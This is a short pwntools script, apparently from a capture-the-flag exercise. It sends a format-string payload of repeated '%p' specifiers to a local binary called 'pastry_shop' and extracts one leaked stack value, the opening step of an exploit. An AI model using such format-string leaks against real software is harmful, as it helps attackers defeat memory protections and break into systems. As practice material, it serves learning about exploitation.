from pwn import *

context.binary=elf=ELF("./pastry_shop")

p=process(elf.path)
p.recv()
payload=b"%p-"*25

p.sendline(payload)
leak=p.recv().decode().split("-")[22]
print(leak)
